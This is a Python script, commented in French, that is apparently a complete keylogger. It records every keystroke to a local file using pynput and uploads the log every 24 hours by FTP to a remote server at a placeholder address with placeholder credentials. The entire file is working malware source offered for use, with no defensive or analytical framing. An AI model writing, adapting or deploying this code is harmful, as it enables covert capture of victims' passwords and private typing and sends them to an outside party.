import threading
from pynput.keyboard import Listener
from ftplib import FTP
import schedule
import time
import os

# Fonction qui sera appelée à chaque frappe de touche
def on_press(key):
    try:
        # Enregistrement de la touche pressée dans un fichier texte
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        # En cas de touche spéciale (e.g. Shift, Ctrl, etc.)
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key}\n")

# Fonction pour démarrer l'écoute des frappes en tâche de fond
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Fonction pour envoyer le fichier via FTP
def send_file_ftp(file_path):
    try:
        # Connexion FTP
        ftp = FTP()
        ftp.set_debuglevel(0)  # Désactive les logs pour éviter de trop polluer la sortie
        ftp.connect("<adresse_ip_ftp>", 21)  # Remplacez par l'adresse IP et le port de votre serveur FTP
        ftp.login("username", "password")  # Remplacez par vos identifiants FTP

        # Envoie le fichier
        with open(file_path, 'rb') as file:
            ftp.storbinary(f"STOR {os.path.basename(file_path)}", file)
        
        print(f"Fichier {file_path} envoyé avec succès via FTP.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier FTP : {e}")
    finally:
        ftp.quit()

# Planification de l'envoi toutes les x heures
def schedule_task():
    file_path = "key_log.txt"  # Le fichier de log à envoyer

    # Vérifier si le fichier existe avant de planifier l'envoi
    if os.path.exists(file_path):
        # Remplacez 24 par le nombre d'heures souhaité
        schedule.every(24).hours.do(send_file_ftp, file_path=file_path)
    
    while True:
        schedule.run_pending()  # Vérifie et exécute les tâches programmées
        time.sleep(1)  # Pause d'une seconde pour ne pas surcharger le CPU

# Fonction principale qui va créer un thread pour écouter les frappes clavier
def main():
    # Démarrer un thread pour l'écoute des frappes clavier en tâche de fond
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Le thread va s'arrêter automatiquement quand le programme principal se termine
    keylogger_thread.start()

    # Planification de l'envoi en arrière-plan
    schedule_task()

if __name__ == "__main__":
    main()
